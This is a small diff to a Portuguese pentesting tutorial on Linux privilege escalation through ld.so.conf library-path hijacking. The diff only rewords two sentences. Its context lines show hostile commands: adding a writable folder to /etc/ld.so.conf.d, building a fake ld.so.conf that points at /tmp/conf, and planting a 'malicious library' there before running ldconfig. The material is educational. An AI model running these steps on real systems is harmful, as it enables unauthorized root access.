@@ -65,7 +65,7 @@ Neste cenário, vamos supor que **alguém criou uma entrada vulnerável** dentro
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de gravação).\
+A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso gravável).\
 **Baixe e compile** o seguinte código dentro desse caminho:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
@@ -117,7 +117,7 @@ cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Agora, como indicado na **exploração anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
+Agora, como indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
 E finalmente, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
 ```bash
 ldconfig -f fake.ld.so.conf
